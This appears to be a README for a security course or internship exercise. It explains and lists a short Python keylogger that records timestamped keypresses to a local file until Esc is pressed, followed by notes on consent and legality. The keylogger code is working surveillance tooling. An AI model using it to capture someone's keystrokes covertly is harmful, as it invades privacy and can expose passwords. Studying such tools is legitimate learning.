# PRODIGY_CS_04

Basic Keylogger Program

This program records and logs keystrokes, saving them to a file. Please note that keyloggers can be used for malicious purposes, and it's essential to use this program responsibly and with the user's consent.

Working:

Importing necessary libraries: The program uses the pynput library to listen to keyboard events and the datetime library to timestamp the logs.
Defining the logging function: The on_press function is called whenever a key is pressed. It logs the key pressed, along with the timestamp, to a file named keylog.txt.
Starting the keylogger: The Listener object is created, and the start method is called to begin listening to keyboard events.

Copy code
import pynput
from pynput.keyboard import Key, Listener
import datetime

def on_press(key):
    with open('keylog.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - {key}\n")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
How it works:

Run the program, and it will start listening to keyboard events.
Whenever a key is pressed, the on_press function is called, logging the key pressed and the timestamp to the keylog.txt file.
To stop the keylogger, press the Esc key.
Example output:

Ethical considerations:

Keyloggers can be used to invade users' privacy, so it's essential to use this program responsibly and with the user's consent.
Never use a keylogger to monitor someone's activity without their knowledge and permission.
Be aware of local laws and regulations regarding keyloggers and privacy.
Permissions:

Before running this program, ensure you have the necessary permissions to monitor keyboard events.
Be cautious when running this program on systems with sensitive information, as it may be considered a security risk.
Remember, keyloggers can be powerful tools, but they require responsible use and respect for users' privacy.
